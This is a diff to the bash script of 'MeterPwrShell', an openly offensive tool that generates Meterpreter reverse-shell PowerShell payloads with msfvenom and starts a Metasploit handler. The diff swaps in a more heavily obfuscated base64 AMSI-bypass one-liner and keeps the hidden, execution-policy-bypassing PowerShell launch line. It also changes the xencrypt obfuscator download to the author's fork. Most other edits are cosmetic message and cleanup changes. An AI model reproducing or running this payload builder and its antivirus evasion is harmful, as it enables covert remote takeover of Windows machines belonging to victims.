@@ -6,7 +6,7 @@ red='\e[1;31m' #goddamn it please dont fucking change it
 BlueF='\e[1;34m' #goddamn it please dont fucking change it
 COWSAYFILE=/usr/bin/cowsay #goddamn it please dont fucking change it
 COWSAYFILESOURCE=/usr/games/cowsay #you can change this as you want
-AMSIBYPASSCODEINBASE64="WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwAgACsAIAAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkAJwAgACsAIAAnAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA=" #this is the default one....please dont change
+AMSIBYPASSCODEINBASE64="KAAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAGcAZQB0AHQAeQBwAGUAcwAoACkAIAB8ACAAPwAgAHsAJABfAC4ATgBhAG0AZQAgAC0AbABpAGsAZQAgACQAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBBAHMARQA2ADQAUwB0AHIAaQBuAGcAKAAnAFEAUQBCAHQAJwArACcAQQBIAE0AQQBhAFEAQQAnACsAJwBxAEEASABRAEEAYQBRAEIAJwArACcAcwBBAEgATQBBACcAKQApACkAfQApAC4ARwBlAHQARgBpAGUAbABkAHMAKAAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAQQBzAEUANgA0AFMAdAByAGkAbgBnACgAJwBUACcAKwAnAGcAQgAnACsAJwB2AEEARwA0AEEAVQBBAEIAMQBBAEcASQBBAGIAJwArACcAQQBCAHAAQQBHAE0AQQBMAEEAQgBUAEEASABRAEEAWQBRAEIAMABBACcAKwAnAEcAawBBAFkAdwBBAD0AJwApACkAKQApACAAfAAgAD8AIAB7ACQAXwAuAE4AYQBtAGUAIAAtAGwAaQBrAGUAIAAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAQQBzAEUANgA0AFMAdAByAGkAbgBnACgAJwBZACcAKwAnAFEAQgB0AEEASABNAEEAJwArACcAYQBRAEIASgBBAEcANABBAGEAJwArACcAUQBCADAAQQBDAG8AQQBZAFEAQgAnACsAJwBwAEEARwB3AEEAWgBRACcAKwAnAEIAawBBAEEAPQA9ACcAKQApACkAfQApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkACgA=" #this is the default one....please dont change
 ATTACKERARCH=`dpkg --print-architecture` #goddamn it please dont fucking change it
 DETECTINTERNETCONNECTION=yes #not recommended to change it but you can change it to "no"
 DETECTATTACKERLINUXDISTRIBUTION=yes #not recommended to change it but you can change it to "no" 
@@ -16,8 +16,26 @@ VERSION=v3.1.0 #goddamn it please dont fucking change it
 #------------colors and configs----------
 #deleting old debug.log
 rm debug.log &> /dev/null
-#installing prequisite
 touch debug.log &> /dev/null
+#control-c code
+exitdacode ()
+{
+echo ""
+echo -e $red "[!!!] Control-C Catched [!!!]"
+echo -e $red "Removing Undone Files If Exist ..."
+rm 1xencrypted.ps1 &> /dev/null
+rm 1.ps1 &> /dev/null
+rm dontremove.txt &> /dev/null
+rm xencrypt.ps1 &> /dev/null
+echo -e $red "Exiting ..."
+read -t 2
+exit
+}
+#control-c catcher
+trap exitdacode SIGINT
+#session id 
+echo "#SESSION ID NUMBER : $SESSIONID" &>> debug.log
+#write program configs on debug.log
 echo "#ProgramConfigs" &>> debug.log
 echo "COWSAYFILESOURCE = $COWSAYFILESOURCE" &>> debug.log
 echo "AMSIBYPASSCODEINBASE64 (default) = $AMSIBYPASSCODEINBASE64" &>> debug.log
@@ -26,8 +44,6 @@ echo "DETECTINTERNETCONNECTION = $DETECTINTERNETCONNECTION" &>> debug.log
 echo "DETECTATTACKERLINUXDISTRIBUTION = $DETECTATTACKERLINUXDISTRIBUTION" &>> debug.log
 echo "ENABLEROOTDETECTOR = $ENABLEROOTDETECTOR" &>> debug.log
 #[-------------------------BEGIN debug.log ZONE-------------------------]
-#session id 
-echo "#SESSION ID NUMBER : $SESSIONID" &>> debug.log
 #root detector
 if [ $ENABLEROOTDETECTOR = yes ]; then
     if [ $(id -u) -ne 0 ]; then
@@ -44,20 +60,14 @@ if [ $DETECTATTACKERLINUXDISTRIBUTION = "yes" ]; then
     if [ $ATTACKERLINUXDISTRIBUTION = "Kali" ]; then
         echo "#linux distribution supported" &>> debug.log
         echo -e $red "[---] Linux Distribution Supported [---]"
-        echo -e $red "Continuing..."
-        read -t 2
         echo "#linux distribution = kali" &>> debug.log
     elif [ $ATTACKERLINUXDISTRIBUTION = "Debian" ]; then
         echo "#linux distribution supported" &>> debug.log
         echo -e $red "[---] Linux Distribution Supported [---]"
-        echo -e $red "Continuing..."
-        read -t 2
         echo "#linux distribution = debian" &>> debug.log
     elif [ $ATTACKERLINUXDISTRIBUTION = "Ubuntu" ]; then
         echo "#linux distribution supported" &>> debug.log
         echo -e $red "[---] Linux Distribution Supported [---]"
-        echo -e $red "Continuing..."
-        read -t 2
         echo "#linux distribution = ubuntu" &>> debug.log
     else
         echo -e $red "[!!!WARNING!!!] LINUX DISTRIBUTION UNSUPPORTED [!!!WARNING!!!]"
@@ -106,6 +116,7 @@ if [ $DETECTINTERNETCONNECTION = "no" ]; then
         fi
     done
 fi
+#installing prequisite
 #[-------------------------BEGIN debug.log ZONE-------------------------]
 echo -e $red "[---] Installing Prequisite...... [---] "
 echo "#installing wget,figlet,curl,gnupg,apt-transport-https,and cowsay with apt command" &>> debug.log
@@ -121,15 +132,15 @@ while true; do
         echo -ne $red "Have You Backed Up The Old output/ Directory Yet??? (yes/no) : "
         read outputdirectorybackup
         if [ "$outputdirectorybackup" = "no" ] ; then
-            echo -e $red " [!!!WARNING!!!] We Will Delete Old output/ Directory [!!!WARNING!!!]"
-            echo -e $red " [!!!WARNING!!!] Please Backup It Now !!! [!!!WARNING!!!]"
-            echo -e $red " Exiting ......"
+            echo -e $red "[!!!WARNING!!!] We Will Delete Old output/ Directory [!!!WARNING!!!]"
+            echo -e $red "[!!!WARNING!!!] Please Backup It Now !!! [!!!WARNING!!!]"
+            echo -e $red "Exiting ......"
             cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
             exit
         fi
         if [ "$outputdirectorybackup" = "yes" ] ; then
-            echo -e $red " Okie Dokie Than :)"
-            echo -e $red " Removing And Continuing ......"
+            echo -e $red "Okie Dokie Than :)"
+            echo -e $red "Removing And Continuing ......"
             echo "#removing old output/ directory" &>> debug.log
             rm -rf output/ &>> debug.log
             read -t 3
@@ -228,7 +239,7 @@ index=$(($RANDOM % $size))
 banner=${array[$index]}
 }
 
-centerthebanner()
+centerthebanner ()
 {
     columns="$(tput cols)"
     while IFS= read -r line; do
@@ -239,19 +250,19 @@ centerthebanner()
 showbanner ()
 {
 if [ "$banner" = "iloveyoushell" ]; then
-    cowsay -f kiss "I Love You,Shell" &>> banner.txt
+    cowsay -f kiss "I Love You,Shell" 1>> banner.txt 2>> debug.log
     centerthebanner "banner.txt"
     rm banner.txt
 elif [ "$banner" = "iseeanintruder" ]; then
-    cowsay -f eyes "I See An Intruder !!!" &>> banner.txt
+    cowsay -f eyes "I See An Intruder !!!" 1>> banner.txt 2>> debug.log
     centerthebanner "banner.txt"
     rm banner.txt
 elif [ "$banner" = "waftdh" ]; then
-    cowsay -f tux "We Are Forced To Do Hacking,Aren't We ??" &>> banner.txt
+    cowsay -f tux "We Are Forced To Do Hacking,Aren't We ??" 1>> banner.txt 2>> debug.log
     centerthebanner "banner.txt"
     rm banner.txt
 elif [ "$banner" = "normalfiglet" ]; then
-    figlet "...MeterPwrShell..." &>> banner.txt
+    figlet "...MeterPwrShell..." 1>> banner.txt 2>> debug.log
     centerthebanner "banner.txt"
     rm banner.txt
 fi
@@ -275,12 +286,13 @@ echo -e $okegreen "Please Fill This Form First!!"
 setpayloadvariables ()
 {
 echo -e $BlueF "Enter It Blank If You Want To Use Default Option"
+echo -e $BlueF "[-----------------------------------------------------------] "
 while true; do
     echo -ne $BlueF "Do You Want To Use Your Custom Powershell Payload ??? (Default = no) (yes/no) : ";tput sgr0
     read custompayload
     if [ -z "$custompayload" ]; then
         custompayload=no
-        echo -e $BlueF "So You Dont Wanna Use Custom Payload ?? Alrighty Then :)"
+        echo -e $BlueF "So You Dont Wanna Use Custom Payload ??? Alrighty Then :)"
         echo -e $BlueF "[-----------------------------------------------------------] "
     elif [ -n "$custompayload" ]; then
         echo -e $BlueF "[-----------------------------------------------------------] "
@@ -305,15 +317,16 @@ while true; do
                 bypassamsi=yes
                 echo -e $BlueF "You Can Read More About AMSI In Here : https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal"
                 read -t 1
-                echo -e $red "[!!!WARNING!!!] YOU NEED TO EXECUTE THE PAYLOAD ON POWERSHELL,NOT CMD.CAUSE CMD WILL TRUNCATE YOUR PAYLOAD!!! [!!!WARNING!!!]"
+                echo -e $red "[!!!WARNING!!!] YOU NEED TO EXECUTE THE PAYLOAD ON POWERSHELL,NOT CMD.BECAUSE CMD WILL TRUNCATE YOUR PAYLOAD!!! [!!!WARNING!!!]"
                 while true; do
                     echo -ne $BlueF "Please Choose Between AMSI Bypass Code Technique Or Encryption Technique (amsibypasscode/encryption) : "; tput sgr0
                     read chooseamsibypasstechnique
                     if [ "$chooseamsibypasstechnique" = "amsibypasscode" ]; then
                         amsibypasstechnique=amsibypasscode             
                         echo -e $BlueF " [--------------------] "
-                        echo -e $BlueF "What Is Your Amsi Bypass Code ???"
+                        echo -e $BlueF "What Is Your AMSI Bypass Code ???"
                         echo -e $BlueF "You Need To Encode The Code With Base64 UTF16LE !!!"
+                        echo -e $BlueF "You Can Read More AMSI Bypass Code At https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell"
                         echo -e $BlueF "Just Enter It Blank If You Want To Use Default AMSI Bypass Code"
                         echo -ne $BlueF "Your Amsi Bypass Code In Base64 : "
                         read customamsibypasscode
@@ -419,23 +432,26 @@ else
     checkcustompayload
 fi
 while true; do
-    echo -ne $BlueF "Are The Variables Correct ??? (yes/no) : "
-    read isthevariablescorrect
-    if [ "$isthevariablescorrect" = "no" ]; then
+    echo -e $BlueF "The LHOST, LPORT, PAYLOAD, and *ARCH Values ​​Must Be Correct !!!"
+    echo -ne $BlueF "Are The Values Are Correct ??? (yes/no) : "
+    read isthevaluescorrect
+    if [ "$isthevaluescorrect" = "no" ]; then
         echo -e $BlueF "Resetting All Variables ..."
         read -t 2
         echo -e $BlueF "[-----------------------------------------------------------] "
         setpayloadvariables
         break
-    elif [ "$isthevariablescorrect" = yes ]; then
+    elif [ "$isthevaluescorrect" = yes ]; then
         echo -e $BlueF "Continuing ..."
         read -t 2
         echo -e $BlueF "[-----------------------------------------------------------] "
         break
+    else
+        echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
     fi
 done
 if [ $custompayload = no ]; then
-    echo "#variableoptions" &>> debug.log
+    echo "#variablevalues" &>> debug.log
     echo "your metasploit framework path : $msfpath" &>> debug.log
     echo "msfpayload : $msfpaytype" &>> debug.log
     echo "lhost/yourip : $yourip" &>> debug.log
@@ -450,7 +466,7 @@ if [ $custompayload = no ]; then
     fi
 fi
 if [ $custompayload = yes ]; then
-    echo "#variableoptions" &>> debug.log
+    echo "#variablevalues" &>> debug.log
     echo "your custom payload path : $custompayloadpath" &>> debug.log
     echo "your victim architecture : $victimarch" &>> debug.log
     echo "bypass AMSI : $bypassamsi" &>> debug.log
@@ -481,8 +497,8 @@ if [ $custompayload = no ]; then
             echo "#making meterpreter powershell payload" &>> debug.log
             msfvenom -p $msfpaytype LHOST=$yourip LPORT=$yourport --smallest -f psh -o 1.ps1 &>> debug.log
             echo "#creating amsi bypass code" &>> debug.log
-            echo "powershell.exe -W Hidden -nop -ep bypass -NoExit -E $AMSIBYPASSCODEINBASE64;" >> dontremove.txt
-            echo "#encoding your custom powershell payload with base64 encoder" &>> debug.log
+            echo "powershell.exe -W Hidden -nop -ep bypass -NoExit -E $AMSIBYPASSCODEINBASE64;" &>> dontremove.txt
+            echo "#encoding meterpreter powershell payload with base64 encoder" &>> debug.log
             cat 1.ps1 | iconv -f UTF8 -t UTF16LE | base64 >> dontremove.txt
             cat dontremove.txt | tr -d '\n' &>> meterpwrshell.output.$payarch.$SESSIONID.txt
             echo -e "use exploit/multi/handler\nset payload $msfpaytype\nset lhost $yourip\nset lport $yourport\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo true\nset AutoLoadStdapi true\nset InitialAutoRunScript 'post/windows/manage/migrate'\nexploit -j" >> meterpwrshell.handler.$payarch.$SESSIONID.rc
@@ -504,7 +520,7 @@ if [ $custompayload = no ]; then
                 apt-get install powershell &>> debug.log
             fi
             echo "#downloading xencrypt to encrypt the payload" &>> debug.log
-            wget https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1 &>> debug.log
+            wget https://raw.githubusercontent.com/GetRektBoy724/xencrypt/master/xencrypt.ps1 &>> debug.log
             echo "#making meterpreter powershell payload" &>> debug.log
             msfvenom -p $msfpaytype LHOST=$yourip LPORT=$yourport --smallest -f psh -o 1.ps1 &>> debug.log
             echo "#encrypting meterpreter powershell payload with xencrypt" &>> debug.log
@@ -519,9 +535,9 @@ if [ $custompayload = no ]; then
             mv meterpwrshell.output.$payarch.$SESSIONID.txt output/ &>> debug.log
             echo "#deleting non-needed files" &>> debug.log
             rm 1.ps1 &>> debug.log
-            rm 1xencrypted.ps1 &>> debug.log
             rm dontremove.txt &>> debug.log
             rm xencrypt.ps1 &>> debug.log
+            rm 1xencrypted.ps1
         fi
     fi
 fi
@@ -553,7 +569,7 @@ if [ $custompayload = yes ]; then
                 apt-get install powershell &>> debug.log
             fi
             echo "#downloading xencrypt to encrypt the payload" &>> debug.log
-            wget https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1 &>> debug.log
+            wget https://raw.githubusercontent.com/GetRektBoy724/xencrypt/master/xencrypt.ps1 &>> debug.log
             echo "#encrypting your custom powershell payload with xencrypt" &>> debug.log
             pwsh -c "Import-Module ./xencrypt.ps1; Invoke-Xencrypt -InFile $custompayloadpath -OutFile 1xencrypted.ps1" &>> debug.log
             cat 1xencrypted.ps1 | iconv -f UTF8 -t UTF16LE | base64 >> dontremove.txt
@@ -576,29 +592,30 @@ if [ $custompayload = no ]; then
     echo -e $okegreen "[---] The Handler File Is On The : output/meterpwrshell.handler.$payarch.$SESSIONID.rc [---]"
 fi
 echo -e $okegreen "[---] The Debug File Is On The : debug.log [---]"
+
 while true; do
     if [ $custompayload = no ]; then
         echo -ne $okegreen "[---] Do You Want To Start The Metasploit Handler ??? [---] (yes/no) : ";tput sgr0
         read startmsfhandler
         if [ "$startmsfhandler" = "yes" ]; then
             echo -e $okegreen "[---] Launching,Please Wait ...... [---]"
-            msfconsole -r output/meterpwrshell.handler.$payarch.rc
-            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
+            msfconsole -r output/meterpwrshell.handler.$payarch.$SESSIONID.rc
             echo -e $okegreen "This Tool Is Not Completely Bugless"
             echo -e $okegreen "If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
+            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
             break
         fi
         if [ "$startmsfhandler" = "no" ]; then
-            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
             echo -e $okegreen "This Tool Is Not Completely Bugless"
             echo -e $okegreen "If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
+            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
             exit
         else
             echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
         fi
     else
-        cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
         echo -e $okegreen "This Tool Is Not Completely Bugless"
-        echo -e $okegreen "If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues" 
+        echo -e $okegreen "If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
+        cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!" 
     fi
 done
